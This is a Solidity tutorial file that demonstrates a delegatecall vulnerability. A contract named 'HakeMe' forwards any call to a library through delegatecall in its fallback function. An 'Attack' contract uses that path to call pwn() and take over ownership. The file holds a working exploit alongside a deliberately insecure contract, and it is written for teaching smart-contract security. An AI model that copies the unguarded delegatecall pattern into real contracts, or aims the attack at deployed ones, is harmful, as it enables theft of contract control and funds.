// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

//DelegateCall

//Vulnerability

/**Delgatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.
 * you must keep 2 things in mind when using delegatecall
 *
 * 1)delegateCall preserves context(storage, caller, etc/.)
 * 2)storage layout must be the same for the contract calling delegatecall and the contract getting called
 *
 */

/**
 * HackMe is contract that uses delegatecalll to execute code.
 * It is not obvious tht the owner of HakeMe can be changed since ther is no function inside HakeMe to do so. However an attacker can hijack the contract by exploiting delegatecall. Let's see How
 *
 *
 * 1)Alice deploys Lib
 * 2)Alice deploys HackMe with address of Lib
 * 3)Eve deploys Attack with address of HackMe
 * 4)Eve calls Attack.attact()
 * 5) Attactis now the owner of HakeME
 */

/**
 * What Happened?
 * Eve Called Attact.attact()
 * Attact called the fallback function of HakeMe sending the function
 * Selector of pwn(). HakeMe forwards the call to lib using delegatcall
 * Heremsg.data contains the function selector of pwn().
 * This tells Solidity to call the function pwn() inside Lib.
 * The Function pwn() update the owner to msg.sender
 * Delegatecall runs the code of Lib using the context of HakeMe.
 * Therfore HakeMe's storage was updated to msg.sender where msg.sender is the caller of HackMe, in this case Attack.
 *
 *
 */

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract HakeMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hakeme) {
        hackMe = _hakeme;
    }

    function attact() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}
